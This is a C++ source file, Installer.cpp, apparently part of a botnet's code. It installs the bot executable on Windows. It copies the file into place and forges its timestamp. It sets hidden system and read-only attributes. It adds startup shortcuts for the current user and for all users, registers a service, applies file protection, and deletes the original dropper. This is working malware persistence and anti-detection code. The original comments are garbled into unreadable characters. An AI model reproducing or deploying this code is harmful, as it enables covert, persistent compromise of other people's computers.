
//****************************************************************************
//  Installer.cpp
//
//  ������ ���������� ������� ���������� ����
//
//  ������� 1.0
//  �������������: ������ 2012
//****************************************************************************

#include <ShlObj.h>
#include "BotCore.h"
#include "StrConsts.h"
#include "BotClasses.h"
#include "BotUtils.h"

//---------------------------------------------------------------------------
#include "BotDebug.h"

namespace INSTALLERDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define INSTDBG INSTALLERDEBUGSTRINGS::DBGOutMessage<>

//---------------------------------------------------------------------------


void DoAddLinkToAutorun(TBotStrings &Added, const char* FileName, const string &LinkName)
{
	if (!LinkName.IsEmpty() && (Added.IndexOf(FileName) < 0))
	{
		// ������ ������ �����
		CreateLink(LinkName.t_str(), FileName, NULL, NULL, NULL);
		if (File::IsExists(LinkName.t_str()))
		{
			Added.Add(LinkName);
            INSTDBG("Installer", "��������� ����� � ������������ %s", LinkName.t_str());
        }
    }
}
//----------------------------------------------------------------------------

void AddBotToAutoRun(const char* FileName)
{
	// ������ ��� ������
	TBotStrings Added;
    string Link = BOT::GetBotLinkName();
	// ������ ������ � ������ ������������
	string LinkFile;
	// ������ ������������ �������� ������������
	LinkFile = GetSpecialFolderPathA(CSIDL_STARTUP, Link);
	DoAddLinkToAutorun(Added, FileName, LinkFile);

	// ����� ������������ ���� �������������
	LinkFile = GetSpecialFolderPathA(CSIDL_COMMON_STARTUP, Link);
	DoAddLinkToAutorun(Added, FileName, LinkFile);
}
//----------------------------------------------------------------------------


//----------------------------------------------------
//  Install - ������� ����������� ����
//
//  IsUpdate - ������� ����, ��� ��� ���������� ����
//             � �� ������ ����������
//----------------------------------------------------
bool BOT::Install(const char* FileName, bool IsUpdate)
{
	if (!File::IsExists((PCHAR)FileName))
		return false;


	string BotFile = GetBotFullExeName();

	// ��������� �� �������� �� �� ��������� ���������� ��
	// ������ ����
	if (StrSame((PCHAR)FileName, BotFile.t_str(), false, 0))
		return false;

	INSTDBG("Installer", "����������� ���. Exe ���� %s", BotFile.t_str());

	// ������� ������ � ������� ����
	Unprotect();
	DeleteBotFile(BotFile.t_str(), INFINITE, false);

	//  �������� ����
	BOOL Result = (BOOL)pCopyFileA(FileName, BotFile.t_str(), TRUE);
	INSTDBG("Installer", "�������� ���� ����. [Result=%d; Err=%d]", Result, pGetLastError());

	if (Result)
	{
		// ������������� ���� � �������� �����
		SetFakeFileDateTime(BotFile.t_str());
		pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );

		// ��������� ���� � ������������
		AddBotToAutoRun(BotFile.t_str());
    }


	// ����������� ������
	if (IsUpdate)
	{
		// ��������� ������
		// � ������ ������� �������� ���������� ������ ������
		if (!UpdateService(FileName))
			InstallService(FileName);
	}
	else
		InstallService(FileName);


	// ������ ������ �� ��� ����
	Protect(BotFile.t_str());

	// ������� ���� ��������
	pDeleteFileA(FileName);

	if (Result)
		INSTDBG("Installer", "��� ������� ����������");
	else
		INSTDBG("Installer", "������ ��������� ����");

	return Result != FALSE;
}
//----------------------------------------------------------------------------

//----------------------------------------------------
//  MakeUpdate - ������� ��������� ����
//----------------------------------------------------
bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
{
	// ��� ������������� ������ ���������� ���������
	if (ResetSettings)
		DeleteSettings();

	return Install(FileName, true);
}
